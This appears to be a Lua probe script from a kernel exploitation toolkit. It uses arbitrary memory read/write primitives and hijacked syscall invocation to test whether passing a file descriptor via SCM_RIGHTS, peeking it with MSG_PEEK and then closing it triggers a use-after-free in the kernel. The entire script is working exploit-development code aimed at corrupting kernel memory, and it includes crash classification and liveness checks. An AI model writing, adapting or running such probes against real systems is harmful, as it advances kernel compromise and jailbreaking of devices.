-- CRASH_CLASS: MODERATE
-- PROBE 661a: MSG_PEEK with SCM_RIGHTS. Each peek installs an fd into our
-- table; if the message does not hold a reference per install, closing a
-- peeked fd frees the file while the queue still points at it.
print("=== PROBE 661a: SCM_RIGHTS + MSG_PEEK ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rdd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function z(a,n) for k=0,n-8,8 do wq(N(a)+k,uint64(0)) end end
local function pair() local s=memory.alloc(8); z(s,8)
  select(2,pcall(function() return mk(135)(U(1),U(1),U(0),U(N(s)),U(0),U(0)) end))
  return rdd(N(s)),rdd(N(s)+4) end
local function openzero() local p=memory.alloc(16)
  for i,c in ipairs({47,100,101,118,47,122,101,114,111,0}) do wb(N(p)+i-1,c) end
  return N(select(2,pcall(function() return mk(5)(U(N(p)),U(0),U(0),U(0),U(0),U(0)) end))) end
local function fstat(fd) local st=memory.alloc(0x100)
  local r=select(2,pcall(function() return mk(189)(U(fd),U(N(st)),U(0),U(0),U(0),U(0)) end))
  return N(r), rdd(N(st)) end
local A,B=pair()
local V=openzero()
print(string.format("[A] A=%s B=%s V=%s",tostring(A),tostring(B),tostring(V)))
local data=memory.alloc(16); wb(N(data),65)
local iov=memory.alloc(16); wq(N(iov),N(data)); wq(N(iov)+8,1)
local ctl=memory.alloc(64); z(ctl,64)
wd(N(ctl),20); wd(N(ctl)+4,0xFFFF); wd(N(ctl)+8,1); wd(N(ctl)+0x10,V)
local mh=memory.alloc(0x40); z(mh,0x40)
wq(N(mh)+0x10,N(iov)); wq(N(mh)+0x18,1); wq(N(mh)+0x20,N(ctl)); wd(N(mh)+0x28,24)
local s=N(select(2,pcall(function() return mk(28)(U(A),U(N(mh)),U(0),U(0),U(0),U(0)) end)))
print(string.format("[B] sendmsg rv=%s",tostring(s)))
local function recv(flags)
  local rb=memory.alloc(16); z(rb,16)
  local i2=memory.alloc(16); wq(N(i2),N(rb)); wq(N(i2)+8,1)
  local c2=memory.alloc(128); z(c2,128)
  local m2=memory.alloc(0x40); z(m2,0x40)
  wq(N(m2)+0x10,N(i2)); wq(N(m2)+0x18,1); wq(N(m2)+0x20,N(c2)); wd(N(m2)+0x28,128)
  local r=N(select(2,pcall(function() return mk(27)(U(B),U(N(m2)),U(flags),U(0),U(0),U(0)) end)))
  return r, rdd(N(c2)+0x10), rdd(N(m2)+0x28)
end
local r1,f1,c1=recv(0x02)
print(string.format("[C] peek1 rv=%s fd=%s clen=%s",tostring(r1),tostring(f1),tostring(c1)))
local r2,f2,c2=recv(0x02)
print(string.format("[D] peek2 rv=%s fd=%s clen=%s",tostring(r2),tostring(f2),tostring(c2)))
if f1 and f1>0 then
  local fr,mo=fstat(f1); print(string.format("[E] fstat(peek1 %d) rv=%s mode=%X",f1,tostring(fr),mo or 0))
  print(string.format("[F] close(peek1)=%s",tostring(select(2,pcall(function() return mk(6)(U(f1),U(0),U(0),U(0),U(0),U(0)) end)))))
end
if f2 and f2>0 then
  print(string.format("[G] close(peek2)=%s",tostring(select(2,pcall(function() return mk(6)(U(f2),U(0),U(0),U(0),U(0),U(0)) end)))))
end
local r3,f3,c3=recv(0x80)
print(string.format("[H] real recv rv=%s fd=%s clen=%s",tostring(r3),tostring(f3),tostring(c3)))
if f3 and f3>0 then
  local fr,mo=fstat(f3)
  print(string.format("[I] fstat(recv %d) rv=%s mode=%X",f3,tostring(fr),mo or 0))
  print(string.format("[J] close(recv)=%s",tostring(select(2,pcall(function() return mk(6)(U(f3),U(0),U(0),U(0),U(0),U(0)) end)))))
end
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
